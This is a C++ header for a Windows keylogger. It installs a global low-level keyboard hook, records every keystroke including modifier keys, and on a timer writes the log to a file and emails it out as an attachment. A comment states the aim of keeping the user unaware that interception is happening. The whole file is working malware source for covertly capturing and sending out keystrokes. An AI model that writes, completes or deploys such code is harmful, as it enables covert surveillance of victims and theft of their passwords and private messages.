#ifndef KEYHOOK_H
#define KEYHOOK_H

#include <iostream>
#include <fstream>
#include "windows.h"
#include "KeyConstants.h"
#include "Timer.h"
#include "SendMail.h"

std::string keylog {""};

void TimerSendMail(){
    if(keylog.empty()) return;

    std::string last_file = IO::WriteLog(keylog);
    if(last_file.empty()){
        Helper::WriteAppLog("File creation was not successful. Keylog \"" + keylog + "\"");
        return;
    }

    int mail_status = Mail::SendMail("Log ["+last_file+"]",
                           "The file has been attached to this mail",
                           IO::GetPath(true) + last_file);

    if(mail_status != 7){
        Helper::WriteAppLog("Mail was not sent! Error code: " + Helper::ToString(mail_status));
    }else{
        keylog.clear();
    }
}

Timer MailTimer(TimerSendMail, 500 * 60);                  // Setup our timer for 2 minutes per interval

HHOOK eHook = NULL;                                         // Pointer to hook

LRESULT KeyboardProc(int nCode,                             // event for which we are intercepting.
                     WPARAM wparam,                         // Key type
                     LPARAM lparam){                        // Contains information about a low-level keyboard input event.

    if(nCode < 0){
        CallNextHookEx(eHook, nCode, wparam, lparam);
    }
    KBDLLHOOKSTRUCT *kbs = (KBDLLHOOKSTRUCT *)lparam;       // Allows the key code to be extracted

    if(wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN){    // Standard key press, or alt+keypress
        keylog += Keys::KeyMap[kbs->vkCode].Name;
        if(kbs->vkCode == VK_RETURN){
            keylog += "\n";
        }
    }else if(wparam == WM_KEYUP || wparam == WM_SYSKEYUP){
        DWORD key = kbs->vkCode;
        if(key == VK_CONTROL ||
           key == VK_LCONTROL ||
           key == VK_RCONTROL ||
           key == VK_SHIFT ||
           key == VK_LSHIFT ||
           key == VK_MENU ||
           key == VK_LMENU ||
           key == VK_CAPITAL ||
           key == VK_NUMLOCK ||
           key == VK_LWIN ||
           key == VK_RWIN){
            std::string key_name = Keys::KeyMap[kbs->vkCode].Name;
            key_name.insert(1, "/");
            keylog += key_name;
        }
    }
    return CallNextHookEx(eHook, nCode, wparam, lparam);    // Propagate the event onto the system to the user has no clue interception has occurred
}

bool InstallHook(){
    MailTimer.Start(true);

    eHook = SetWindowsHookEx(                               // Installs an application-defined hook procedure into a hook chain
                             WH_KEYBOARD_LL,                // Indicates this is a global hook for the low level keyboard hook
                             (HOOKPROC)KeyboardProc,        // Procedure that is invoked by sys everytime the user presses key
                             GetModuleHandle(NULL),         // Get the running module
                             0);                            // DW_THREAD_ID - the thread for which this hook procedure is associated to
    return eHook == NULL;
}

bool UninstallHook(){
    bool unhooked = UnhookWindowsHookEx(eHook);
    eHook = NULL;
    return (bool)unhooked;
}

bool IsHooked(){
    return (bool)(eHook == NULL);
}

#endif // KEYHOOK_H
